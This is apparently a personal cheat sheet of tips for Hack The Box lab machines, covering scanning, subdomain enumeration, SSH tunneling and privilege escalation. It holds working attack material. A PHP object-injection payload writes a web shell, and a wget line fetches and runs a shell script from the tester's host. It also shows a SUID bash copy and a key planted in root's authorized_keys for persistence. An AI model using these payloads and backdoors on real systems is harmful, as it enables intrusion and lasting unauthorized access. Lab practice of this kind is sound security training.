1. Always nmap scan from this command to get faster and effective results (Not for OSCP)
`nmap -sV -v -Pn 10.10.10.220`
other 
`nmap -T4 -p- -o nmap.scan [IP]`
2. Useful Repos
- Seclists
- Linpeas, winpeas
- Payload all the things
- Linux priv checker
3. https://medium.com/bugbountywriteup/things-i-learned-after-rooting-25-hack-the-box-machines-e9eada4ea6ca
4. Basic method:
 - Scanning the Machine
-  Initial Foothold
-  Getting user level privilege
-  Privilege Escalation
5. **If you find Port 135 ( MSRPC ), 139 ( NetBios-SSN ) & 445 ( Microsoft-DS )**
It is a delight to see these ports open on a windows machine. Chances are you have a **eternal blue** at your hands or other attacks that are similar to it. Boot up your msfconsole and search for these exploits. There are chances that you might end up getting root access of the machine if the exploit works.

6. Port 80 ( HTTP ) & 443 ( HTTPS )**
For the instance when only port 80 or 443 is opened on the machine then that is a clear indication that in the next few step you should try your web penetration attack vectors and tools.
The first thing that I would do is run a “dirb” directory search, if the machine is taking the load then run a fuzzing attack using “wfuzz”. Browse the website and figure out what are the functionalities that are present. Look for hints in the source-code maybe that will lead you to some revelation, some times there might be a few things that are not printed out on the webpage so be on the look out.

7. **Use each and every thing you discover about exploitation even manual exploitation.**

8. Check for the service running on it for the **config and backup** files they might have something important.
9. If you escape DOCKER then do check for the mounts to get the system files access.
https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1
10. Docker escalation from the admin account by finding the appropriate information you will get it by linpeas in **dump users** section.
11. **Subdomain Enum**: This is also an imortant part of the task 
```bash
wfuzz -w [WORDLIST] -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
gobuster dns -d domain.htb -w [WORDLIST] -i | tee dns_b
gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```
12. **SSH tunneling**
`ssh -L 5555:127.0.0.1:7777 jarvis@0.strk.ml -p 7722`
here in this one 
also then try banner grabbing by nc or any other but nc is first prefrence 
`nc 127.0.0.1 5555`
so by this one you will get the things you need (pivoting)

13. If you see any file on other subdomain then no need to go to that subdomain then jus tdont try on xyz.htb domain try on direct ip ex: tenet.htb has sator subdomain but if we want to call any file of sator subdomain then instead of going there we will go directly to respective ip and call from there cuz subdomains are virtual part of IPs.
`sator.tenet.htb/sator.php`
else
`10.10.10.223/sator.php`
_these both gives the same result_
14. Php object injection - i you find out any php object inkect then according to the source code of php file you will see unserialize function working then make the same function and then you have to make the serialise object example in [tenet HTB](https://www.hackthebox.eu/home/machines/profile/309)
		Solution is in this video and artical:
		[Xero Security](https://xerosecurity.com/wordpress/exploiting-php-serialization-object-injection-vulnerabilities/)
		[Youtube video](https://www.youtube.com/watch?v=gTXMFrctYLE)
```
<?php

class DatabaseExport
{
	public $user_file = 'users.txt'; // there is a file users.txt
	public $data = ''; // data to be written and that is called by data var

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct() // this will get executed automatically when unserialize func get called
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>


```

_Here is the source code of tenet to exploit_

```

<?php

class DatabaseExport
{
	public $user_file = 'shell.php';
	public $data = '<?php system($_GET["x3rz"]);?>';
}

$obj = new DatabaseExport;

echo htmlspecialchars(serialize($obj));

 ?>
```


_Here is the exploit to get the serialise object and then exploit._
`O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["x3rz"]);?>";}`
send this payload in arepo parameter and then you will get a shell.php on root server and then fetch the reverse shell from your system and then boom you got the shell and shell.php parameter is x3rz as you can see in exploit written to get serialise object.


15. If you arent able to get the exact version exploit then try to look for higher version than that for exploits.
16. When heading out for finding ==cve== then first look for ==all RCE== text so that it would be easy to get foothold on machine \
17. For instant access search for auto shell for CVEs or auto exploit. 
****

18. Find ==CVE number== and then ==go to github and search for all the clean possible outcomes.==
****
****
19. it is better to ==download== (and then execute) a shellscript to the target machine, and make the script do all the heavy lifting
	 - Download shell.php.
	 - Visit victim.com/shell.php

or
make a shell.sh and then wget and then bash it
`wget 10.10.14.238/shell.sh && bash shell.sh`

#### Conditions
- if your shell is uploaded then and doesnt worked in same session
- then again execute that particual shell that you put in /tmp folder by curl.

****

20. If you are out of options the always ==copy the /bin/bash to something else and give it `4755` and then do `/tmp/x3rz -p` or `echo the ssh key to authroized_keys`.==
	>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA......" > /root/.ssh/authorized_keys
	***Remember: Dont add htb@xyz***
	>ssh -i id_rsa root@spectra

****

21. How to get reverse shell from msf instead of nc during pivoting is if you sent the .php payload then use php/meterpreter/reverse_tcp else if anything else then search for their respective meterpreter listener.

22. When it comes to looking **bakups** do manual
	- find / -name "user" 2>/dev/null
	- find / -name "\*.conf" 2>/dev/null
	- find / -name "\*.bak" 2>/dev/null


23. If you dont find anything then do sub domain enum by gobuster.
24. then check SSL certificate cuz some of admins use register their ssl on name of their subdomains.